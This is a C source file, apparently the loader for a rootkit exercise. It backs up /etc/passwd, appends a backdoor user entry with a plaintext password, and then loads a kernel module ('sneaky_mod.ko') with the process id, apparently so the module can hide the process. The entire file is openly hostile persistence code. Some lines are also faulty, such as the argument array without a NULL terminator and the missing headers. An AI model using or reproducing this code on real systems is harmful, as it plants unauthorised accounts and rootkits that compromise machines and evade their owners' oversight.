#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main() {
  int rc = fork();  
  if (rc < 0) {
    fprintf(stderr, "fork failed\n");
    exit(1);
  } else if (rc == 0) {
     printf("first 1 sneaky_process pid=%d\n", getpid());
    char * myargs[3];
    myargs[0] = strdup("cp");
    myargs[1] = strdup("/etc/passwd");
    myargs[2] = strdup("/tmp/passwd");
    execvp(myargs[0], myargs);        
  } else {     

    
    wait(NULL);           
    FILE * target = fopen("/etc/passwd", "a");
    char append[] = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
    fprintf(target, "%s", append); 
    fclose(target);  
    
    int _rc = fork();
    if (_rc == 0) {          
      printf("first 2 sneaky_process pid=%d\n", getpid()); 
      char * args[4];
      args[0] = strdup("insmod");
      args[1] = strdup("sneaky_mod.ko");   
      char buf[50];   
      sprintf(buf, "myint=%d", getpid());
      args[2] = strdup(buf);
      args[3] = NULL;
      execvp(args[0], args);
    } else {
      wait(NULL);
      printf("main_process pid=%d\n", getpid()); 
    } 
    
  }
  return 0;
}


